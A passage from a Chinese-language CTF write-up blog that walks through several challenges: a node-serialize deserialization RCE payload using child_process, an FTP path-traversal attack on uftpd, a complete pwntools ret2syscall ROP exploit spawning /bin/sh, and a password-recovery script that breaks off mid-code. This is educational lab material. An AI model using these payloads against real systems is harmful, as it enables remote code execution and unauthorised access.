AIRLINES</strong></h3><p>此题给出了网站的源码，通过简单的审计，猜测这是一道关于反序列漏洞的题目。如下所示，用户所传递的Cookie在没有经过其他过滤的情况下直接被反序列化，因此可能由此完成RCE。查看其完成反序列化操作的包为’node-serialize’并且版本为0.0.4，搜索后发现果然该版本的node-serialize存在反序列化漏洞CVE-2017-5941。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(1).png" alt="2"></p><p>此漏洞的代码存在于<code>node_modules/node-serialize/lib/serialize.js</code>中。我们可以看到，当反序列化对象的值为<code>string</code>并且以<code>FUNCFLAG(i.e. _$$ND_FUNC$$_)</code>开头时，则会调用eval函数。也就是说，如果我们传入的字符串例如:<code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(&#39;xxx&#39;)&#125;&quot;&#125;</code>，则该语句在截取字符串后就变成了<code>eval(function()&#123;console.log(&#39;xxx&#39;)&#125;)</code>。接着，我们还需要该函数在定义后立即执行，所以在其最后加上括号表示使用IIFE立即调用执行，即可完成RCE。所以构造的目标字符串应该形如：<code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function()&#123;console.log(&#39;xxx&#39;)&#125;()&quot;&#125;</code>.</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/qrbi_kEOvPYhh77r_LwZ1Q.jpeg" alt="3"></p><p>虽然该漏洞存在EXP，但是尝试后发现并不能得到shell。所以此类问题还是需要一步一步本地搭环境来调试，不能急功近利。通过Docker搭建好本地环境后，通常需要完成几个步骤来测试EXP。首先，直接修改源码来调试注入的命令。对于反序列化漏洞而言，我们首先编辑注入的代码，将其序列化后，再以Base64的形式编码生成目标的Cookie字符串。</p><p>当本地环境下可以成功运行后，再通过修改请求报文的Cookie，尝试是否可以成功执行拿到Shell。实验后发现，本地搭建的环境确实可以反弹shell,但是目标环境下总是不能成功。因此，我猜想目标服务器的防火墙Drop禁止了除80端口以外的其他连接，也就无法反弹Shell。</p><p>既然SHELL拿不到，如果可以将flag.txt的内容回显到页面上也是可行的，毕竟通过网站源码我们知道flag.txt的地址。所以，我最后修改执行的命令使得flag字符串写入到index.pug文件里，然后触发反序列化漏洞后，再次请求该页面(此时注入的命令已经执行，index.pug被追加了flag字符串)即可看到flag的内容啦。</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> payload <span class="token operator">=</span> '<span class="token punctuation">&#123;</span> <span class="token function-variable function">rce</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">'cat /app/flag'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">error<span class="token punctuation">,</span> stdout<span class="token punctuation">,</span> stderr</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">var</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> fs<span class="token punctuation">.</span><span class="token function">appendFile</span><span class="token punctuation">(</span><span class="token string">'/app/views/index.pug'</span><span class="token punctuation">,</span> <span class="token string">'  p '</span><span class="token operator">+</span>stdout<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>'<span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">serialize</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'()'</span> <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> payload <span class="token operator">=</span> Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>## <span class="token constant">EXPOLIT</span><span class="token keyword">var</span> cookieValue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Buffer</span><span class="token punctuation">(</span><span class="token function">escape</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> userInfo <span class="token operator">=</span> serialize<span class="token punctuation">.</span><span class="token function">unserialize</span><span class="token punctuation">(</span>cookieValue<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/HKgkKtMAku6jLCyAE9ysWw.png" alt="4"></p><h3 id="3-3-BILLBOARD-MAYHEM"><a href="#3-3-BILLBOARD-MAYHEM" class="headerlink" title="3-3 BILLBOARD MAYHEM"></a><strong>3-3 BILLBOARD MAYHEM</strong></h3><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h2><h3 id="1-3-FACTORY-RESET"><a href="#1-3-FACTORY-RESET" class="headerlink" title="1-3 FACTORY RESET"></a><strong>1-3 FACTORY RESET</strong></h3><p>这是一道Linux下利用Web服务的漏洞拿站的题目，类似于渗透测试。</p><p>首先官方给出的VPN密钥远程连接至其内网，使得可以访问到目标主机10.6.0.100.</p><p>我们首先使用nmap对其进行端口扫描，使用-Pn参数默认目标主机存活且无需DNS域名解析。结果可以看到该主机打开了ssh的22号端口以及ftp的21号端口。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/7YdUtZL_wecmh6dzPiz-wA.png" alt="5"></p><p>接着，我们继续查看ssh和ftp服务的版本信息。这里使用nmap的-A参数即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/WdBYRz5hgE5nsb2bQpNnCw.png" alt="6"></p><p>通过结果我们可以看到该ftp服务使用的是uftpd(2.10)而且允许anonymous匿名用户登陆，ftp的可访问目录下存在着三个bash文件。</p><p>顺着思路，我们直接使用nc来连接该ftp端口且使用匿名用户身份登陆。</p><p>​<img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/8bCHHqLj6mUsSWa5ng7C2w.png" alt="7"></p><p>这个时候我继续尝试一些命令如LIST PWD等发现并没有反应，这个的主要原因是ftp协议是带外传输的，也就是说命令连接和数据连接是两个不同的TCP链接。因此我使用其他的ftp链接工具（fileZilla）去连接，并访问得到了这三个bash文件，结果这三个文件并没有什么值得注意的地方。</p><p>此时，我直接去搜索关于uftpd的相关信息，发现uftpd作为开源的ftp服务器已经更新到2.15版本，而目标机器停留在了2.10版本。接着，我找到了关于uftpd的相关漏洞，其中CVE-2020-5221路径穿越漏洞引起了我的注意，毕竟路径穿越就可以找到题目所说的敏感的stolen_data。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(6).png" alt="8"></p><p>根据，<a href="https://arinerron.com/blog/posts/6">此博客</a>提供的POC，我们发现FTP中的若干命令(LIST, RETR)都存在路径穿越的漏洞。不过，回到之前的问题，作为带外传输的FTP协议，我们需要另外建立一个链接来传输数据。这有两种方式，默认为主动连接，即由服务器端主动连接客户端的某个端口，这需要首先使用PORT命令提供客户端开放的端口。但是由于服务器端无法穿越NAT直接连接到我的kali，所以我该用被动链接的方式，也就是由客户端主动连接到服务器中作为数据发送的端口。具体如下所示。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(7).png" alt="9">需要说明的是，PASV使得ftp进入被动模式，给出的10,6,0,100,202,9的含义是开放10.6.0.100:202*256+9端口作为数据传输。所以我是用nc远程连接其51271端口。接着在passwd中我发现存在/var/backups目录，继续使用LIST该目录发现其中存在./DATA/flag1.txt文件。欣喜若狂，至此斩获一150分的大题。</p><pre class="line-numbers language-none"><code class="language-none">CTF&#123;F0rtREss_Br3@c#3d&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-ROP-THE-AI"><a href="#4-2-ROP-THE-AI" class="headerlink" title="4-2 ROP THE AI"></a><strong>4-2 ROP THE AI</strong></h3><p>经典的一道ret2syscall的栈溢出题目。</p><p>首先拿到程序查看其基本信息，发现这是一个静态编译的小端的x86-64位程序。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/sqQNwBMtQXgHCWu2mqwXaw.png" alt="10">     </p><p>接着，使用反汇编一下查看其程序逻辑。发现程序逻辑非常简单，main函数中直接调用名为vuln的函数。而在vuln的函数中，首先声明了一个0x70大小的内存空间，接着使用gets()函数获取用户输入存在此内存空间。所以显然栈溢出漏洞就存在于此。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(8).png" alt="11"></p><p>要对漏洞进行利用，我们还需要知道程序所开启的保护。使用gdb-peda中自带的checksec或者下载的checksec脚本可以帮助我们查看该程序开启的保护措施。由下可见，ROPtheAI开启了Canary以及NX。简单来说，前者在弹栈前检查EBP下方的预置的Cookie是否被用户输入覆盖来判断是否存在栈溢出的情况。后者使得Data段(也就是栈所在的段)不具备执行权限，也就是说用户如果在栈中输入了shellcode也是无法执行的。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/D95JF6Hrh1qZ0ddOl9PP6w.png" alt="12"></p><p>checksec脚本的原理是依赖于readelf工具查看目标程序(ELF，可执行可链接文件格式)的相关信息比如program headers(存储着程序Segment和Section的信息)、符号表(存储着程序中变量、函数名的类型、位置地址等)等。具体地，checksec对于Canary以及NX保护措施的查看方法如下所示，前者是查询符号表中是否存在__stack_chk_fail函数，后者是查询栈的执行权限。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(9).png" alt="13"></p><p>这种判断Canary的方法我们可以猜想会存在假阳性，毕竟存在__stack_chk_fail函数并其不意味着被链接进去。所以具体的情况我们还是要通过动态调试程序来看是否在程序的入口和弹栈时存在对应的汇编代码。这里可以参考<a href="https://ctf-wiki.org/pwn/linux/user-mode/mitigation/canary/">CTFWiki</a>中对于Canary的具体讲解。本ROPtheAI就是这样一个例子，在调试时并没有发现有执行验证Cookie的汇编代码，所以我们无需思考如何绕过Canary。</p><p>对于NX，在动态调试时可以通过vmmap查看栈是否存在可执行的权限。</p><p> <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(10).png" alt="14"></p><p>在摸清程序的保护措施之后，我们首先通过动态调试查看栈的结构，确定缓冲区的大小；然后构造ROP链绕过NX保护。</p><p>程序的栈结构以及入栈出栈的过程可以参考<a href="https://www.cnblogs.com/clover-toeic/p/3755401.html">此篇文章</a>，介绍的非常细致。缓冲区的大小我们可以通过动态调试时查看RSP和RBP所指向的地址查看或者通过cyclic工具构造有规律的字符串，再判断溢出后RBP中所存储的内容判断偏移。由于本程序的汇编非常简单，通过调试我们可以看到栈中保存RET地址的位置距离输入点的偏移的0x70。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(11)-9054164.png" alt="15"></p><p>由于NX保护的开启，我们无法通过最简单的利用gets函数在栈中嵌入一段shellcode，再将ret的地址指向该shellcode的地址，使其执行shellcode。因为存入的shellcode在data段中的栈中，该地址的指令与在text段中的指令不同，没有执行权限。</p><p>但是ROP技术可以避开此限制，成功突破NX保护。ROP(Return Oriented Programming)技术，是在栈缓冲区溢出的基础上，利用程序中已有的存在ret命令的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。其核心是利用了指令集中的 ret 指令，改变了指令流的执行顺序。</p><p>绕过NX有四种常用的方式：ret2text, ret2shellcode, ret2syscall, 以及ret2libc。第一种方式是比较直接，在程序中查找执行system(‘/bin/sh’)的指令，并将其指令地址覆盖到栈中的ret位置。但是通常来讲，程序中可能并不会在这样的指令。第二种方式是通过write方法将shellcode写入.bss段(通常存放着全局变量，具有可执行权限)，然后再将其写入地址存放于ret位置。第三种方式是利用系统调用(32位程序是int 0x80，64位程序是syscall)并修改寄存器使得执行exceve(‘/bin/sh’,0x0,0x0)系统调用。最后一种方式是对于动态链接的程序，利用存储在glibc(GNC的标准C语言库)中的system函数，执行system(‘/bin/sh’).</p><p>此时，我们需要根据程序中提供的gadgets来选择使用那种方法。查看程序的gadgets我们可以使用ROPgadget工具。使用<code>ROPgadget --binary ~/Desktop/ROPtheAI/ROPtheAI | grep syscall</code> 命令我们可以发现程序中存在非常好利用的系统调用，所以我们选择使用ret2syscall的方式利用该漏洞。                 <img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/zayfkMQ1IrSUZOfB7QsdzQ.png" alt="16"></p><p>为了执行exceve系统调用，我们需要使rax的值置为0x3b，表示exceve系统调用的编号；rdi的值置为字符串”/bin/sh\x00”的地址，注意字符串的结尾必须是0x00；rsi和rdx的值为0x00即可。因此我们需要在程序中查找gadgets来构造ROP链，使得执行系统调用时寄存器的值到位。</p><p>接着，我们在全局查找”/bin/sh”字符串，发现并没有该字符串。因此，我们需要利用gadgets向.bss段写入该字符串。首先，我们可以找到操纵rax和rdx的指令，接着我们找一个可以读写的.bss的地址，然后利用类似于mov [rdx], rax；的指令来将字符串写入该地址。具体如下所示。我们找到非常好的写入内存的指令，首先字符串’/bin/sh\x00’正好是8字节，也就是正好放入rax寄存器中，然后rdx置为待写入的地址，然后利用mov qword ptr[rdx], rax指令表示将rax的值放入以rdx的值作为地址的大小为双字(16字节显然足够)的内存中。此payload执行完，我们已将’/bin/sh’写入到地址为0x004b72e0的内存中。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pop_rax <span class="token operator">=</span> <span class="token number">0x0044c043</span> <span class="token comment"># pop rax; ret;</span>pop_rdx <span class="token operator">=</span> <span class="token number">0x004016eb</span> <span class="token comment"># pop rdx; ret;</span>writeable_memory_addr <span class="token operator">=</span> <span class="token number">0x004b72e0</span> <span class="token comment"># bss段内地址</span>write_memory <span class="token operator">=</span> <span class="token number">0x0043e353</span> <span class="token comment"># mov qword ptr[rdx], rax; mov rax, rdi; ret</span>payload <span class="token operator">=</span> <span class="token number">120</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>writeable_memory_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_memory<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着，我们只需重新调整寄存器的值并调用syscall即可。完整的EXP如下所示，我使用了一次可以设置三个寄存器值的指令，最后调整rdi为writeable_memory_addr，最后ret系统调用。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">'little'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'/home/kali/Desktop/ROPtheAI/ROPtheAI'</span><span class="token punctuation">)</span><span class="token comment"># sh = remote("xxx.xxx.xxx.xxx",17004)</span><span class="token comment"># sh = gdb.debug('/home/kali/Desktop/ROPtheAI/ROPtheAI', gdbscript="""</span><span class="token comment"># b vuln</span><span class="token comment"># continue</span><span class="token comment"># """)</span>pop_rax_rdx_rbx <span class="token operator">=</span> <span class="token number">0x00479906</span>pop_rax <span class="token operator">=</span> <span class="token number">0x0044c043</span>pop_rsi <span class="token operator">=</span> <span class="token number">0x004087ce</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x00401931</span>pop_rdx <span class="token operator">=</span> <span class="token number">0x004016eb</span>syscall <span class="token operator">=</span> <span class="token number">0x004011fa</span>writeable_memory_addr <span class="token operator">=</span> <span class="token number">0x004b72e0</span> <span class="token comment"># bss段内地址</span>write_memory <span class="token operator">=</span> <span class="token number">0x0043e353</span> <span class="token comment"># mov qword ptr[rdx], rax; mov rax, rdi; ret</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Please enter your preferred configuration:'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token number">120</span><span class="token operator">*</span><span class="token string">b'A'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>writeable_memory_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>write_memory<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rax_rdx_rbx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3b</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>writeable_memory_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最终成功拿到Shell。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/image(12).png" alt="17"></p><p>最后，其实在整个EXP编写的过程中并不会顺利，所以需要我们使用pwntools自带的gdb来调试我们的payload，查看问题出在哪里再修复，这一点非常重要。此外，通过gdb.debug的方式启用程序可能会由于环境变量，导致栈的内存地址的变化。通过gdb.attach的方式连接已经运行的程序则不会存在这样的问题。</p><h2 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a><strong>Reversing</strong></h2><h3 id="3-1-CRACK-THE-PASSWORD"><a href="#3-1-CRACK-THE-PASSWORD" class="headerlink" title="3-1 CRACK THE PASSWORD"></a><strong>3-1 CRACK THE PASSWORD</strong></h3><p>改题目提供了一个二进制的文件，用十六进制观察之后，发现师ELF文件。使用IDA反编译之后，发现该程序存在验证密码是否正确的函数。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1R8m6flUkhQITA5wzgsFgw.png" alt="18"></p><p>进入validatePassword之后，发现函数的主要逻辑是验证输入字符串的长度和不同位置之间的关系(根据 特定位置字符的十进制表示来确定关系)。仔细观察之后，发现字符串中存在某些可以确定的字符，如a1[13] = 49 （刚好对应数字1），然后通过这些确定的字符，可以将其他的字符确定下来。最后通过编程将整个字符串解密出来。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/AKOl2mA8sMQQB2s149gWtA.png" alt="19"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">password <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">33</span>password<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">;</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token number">0x61</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">29</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token number">0xA</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token comment">#?</span>password<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">19</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span>password<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>password<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token 